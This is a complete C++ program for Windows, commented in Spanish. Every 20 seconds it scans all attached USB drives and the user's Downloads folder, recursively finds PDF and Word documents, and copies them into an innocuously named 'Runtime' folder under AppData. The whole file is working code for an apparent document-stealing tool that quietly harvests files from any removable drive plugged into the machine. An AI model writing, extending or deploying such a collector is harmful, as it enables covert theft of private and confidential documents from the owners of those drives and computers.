#include <iostream> // Mostrar resultados en consola
#include <string> // Manejo de cadenas de texto
#include <filesystem> // Manejo moderno de rutas de archivos y directorios
#include <vector> // Almacenar listas de rutas
#include <chrono> // Controlar intervalos de espera entre escaneos
#include <thread> // Pausar la ejecucion entre escaneos
#include <cstdlib> // Obtener variables de entorno del sistema
#include <windows.h> // Acceder a la API de Windows para identificar unidades

// VARIABLES GLOBALES
std::vector<std::string> extensiones_documentos = {"pdf", "doc", "docx"}; // Extensiones de documentos a detectar
int intervalo_escaneo = 20; // Segundos entre cada escaneo
std::string nombre_usuario = std::getenv("USERNAME"); // Nombre del usuario actual del sistema
std::filesystem::path directorio_guardado = std::filesystem::path("C:/Users") / nombre_usuario / "AppData/Roaming/Runtime"; // Carpeta destino de copias

// FUNCIONES
// Determina si una unidad es extraible (USB) usando la API de Windows
bool es_unidad_extraible(char letra_unidad)
{
    std::string ruta_unidad = std::string(1, letra_unidad) + ":\\";
    UINT tipo_unidad = GetDriveTypeA(ruta_unidad.c_str());
    
    // Tipo 2 corresponde a unidad extraible (USB)
    return tipo_unidad == 2;
}

// Busca dispositivos USB conectados filtrando solo unidades extraibles
std::vector<std::filesystem::path> obtener_unidades_usb()
{
    std::vector<std::filesystem::path> unidades_usb; // Lista para almacenar rutas de unidades USB
    
    // Recorrer letras de unidades posibles de la A a la Z
    for (char letra_unidad = 'A'; letra_unidad <= 'Z'; letra_unidad++)
    {
        std::string ruta_unidad = std::string(1, letra_unidad) + ":/";
        
        // Verificar si la unidad existe y es extraible
        if (std::filesystem::exists(ruta_unidad))
        {
            if (es_unidad_extraible(letra_unidad))
            {
                unidades_usb.push_back(std::filesystem::path(ruta_unidad));
            }
        }
    }
    
    return unidades_usb;
}

// Determina la carpeta de descargas existente (Downloads o Descargas)
std::filesystem::path obtener_carpeta_descargas()
{
    std::filesystem::path ruta_downloads = std::filesystem::path("C:/Users") / nombre_usuario / "Downloads"; // Ruta en ingles
    std::filesystem::path ruta_descargas = std::filesystem::path("C:/Users") / nombre_usuario / "Descargas"; // Ruta en espanol
    
    // Priorizar Downloads si existe
    if (std::filesystem::exists(ruta_downloads) && std::filesystem::is_directory(ruta_downloads))
    {
        return ruta_downloads;
    }
    
    // Usar Descargas si Downloads no existe
    if (std::filesystem::exists(ruta_descargas) && std::filesystem::is_directory(ruta_descargas))
    {
        return ruta_descargas;
    }
    
    return std::filesystem::path();
}

// Busca documentos con extensiones validas dentro de una ruta dada
std::vector<std::filesystem::path> buscar_documentos(std::filesystem::path ruta_busqueda)
{
    std::vector<std::filesystem::path> documentos_encontrados; // Lista para almacenar rutas de documentos
    
    // Verificar que la ruta exista y sea directorio
    if (!std::filesystem::exists(ruta_busqueda) || !std::filesystem::is_directory(ruta_busqueda))
    {
        return documentos_encontrados;
    }
    
    // Buscar cada extension de documento en la ruta
    for (const std::string& extension_val : extensiones_documentos)
    {
        try
        {
            // Recorrer recursivamente todos los archivos de la ruta
            for (const std::filesystem::directory_entry& entrada_iter : std::filesystem::recursive_directory_iterator(ruta_busqueda))
            {
                if (entrada_iter.is_regular_file())
                {
                    // Comparar extension del archivo con la buscada
                    if (entrada_iter.path().extension() == "." + extension_val)
                    {
                        documentos_encontrados.push_back(entrada_iter.path());
                    }
                }
            }
        }
        catch (const std::exception& e)
        {
            continue; // Ignorar errores de acceso en subdirectorios
        }
    }
    
    return documentos_encontrados;
}

// Copia un documento al directorio de guardado evitando sobreescribir existentes
std::filesystem::path copiar_documento(std::filesystem::path ruta_origen)
{
    // Crear directorio de guardado si no existe
    if (!std::filesystem::exists(directorio_guardado))
    {
        std::filesystem::create_directories(directorio_guardado);
    }
    
    // Construir ruta destino con el mismo nombre del archivo
    std::filesystem::path ruta_destino = directorio_guardado / ruta_origen.filename();
    
    // Verificar si el archivo ya existe en destino
    if (std::filesystem::exists(ruta_destino))
    {
        return std::filesystem::path(); // Omitir copia si el archivo ya esta guardado
    }
    
    // Copiar archivo preservando metadatos
    try
    {
        std::filesystem::copy_file(ruta_origen, ruta_destino, std::filesystem::copy_options::overwrite_existing);
        return ruta_destino;
    }
    catch (const std::exception& e)
    {
        return std::filesystem::path(); // Ignorar errores de copia (permisos, archivos bloqueados)
    }
}

// Escanea USB y carpeta de descargas copiando documentos encontrados
void escanear_dispositivos()
{
    std::vector<std::filesystem::path> documentos_totales; // Lista para acumular documentos de todas las fuentes
    
    // Escanear unidades USB conectadas
    std::vector<std::filesystem::path> unidades_usb = obtener_unidades_usb();
    
    // Buscar documentos en cada unidad USB detectada
    for (const std::filesystem::path& unidad_iter : unidades_usb)
    {
        std::vector<std::filesystem::path> documentos_usb = buscar_documentos(unidad_iter);
        documentos_totales.insert(documentos_totales.end(), documentos_usb.begin(), documentos_usb.end());
    }
    
    // Buscar carpeta de descargas existente
    std::filesystem::path carpeta_descargas = obtener_carpeta_descargas();
    
    // Buscar documentos en carpeta de descargas si existe
    if (!carpeta_descargas.empty())
    {
        std::vector<std::filesystem::path> documentos_descargas = buscar_documentos(carpeta_descargas);
        documentos_totales.insert(documentos_totales.end(), documentos_descargas.begin(), documentos_descargas.end());
    }
    
    // Copiar cada documento encontrado al directorio de guardado
    std::vector<std::filesystem::path> copias_realizadas; // Lista para almacenar copias exitosas
    
    for (const std::filesystem::path& doc_iter : documentos_totales)
    {
        std::filesystem::path ruta_copia = copiar_documento(doc_iter);
        
        if (!ruta_copia.empty())
        {
            copias_realizadas.push_back(ruta_copia);
        }
    }
    
    // Mostrar copias realizadas en pantalla
    if (!copias_realizadas.empty())
    {
        // Mostrar separador visual para inicio de resultados
        std::cout << std::string(36, '-') << std::endl;
        
        // Mostrar cada copia realizada con numeracion
        for (size_t indice_doc = 0; indice_doc < copias_realizadas.size(); indice_doc++)
        {
            std::cout << (indice_doc + 1) << ". " << copias_realizadas[indice_doc].string() << std::endl;
        }
        
        // Mostrar separador final
        std::cout << std::string(36, '-') << std::endl << std::endl;
    }
    else
    {
        std::cout << "No new documents found" << std::endl << std::endl;
    }
}

// PUNTO DE PARTIDA
int main()
{
    // Bucle principal del programa
    while (true)
    {
        // Ejecutar escaneo de dispositivos y copia de documentos
        escanear_dispositivos();
        
        // Esperar intervalo definido antes del siguiente escaneo
        std::this_thread::sleep_for(std::chrono::seconds(intervalo_escaneo));
    }
    
    return 0;
}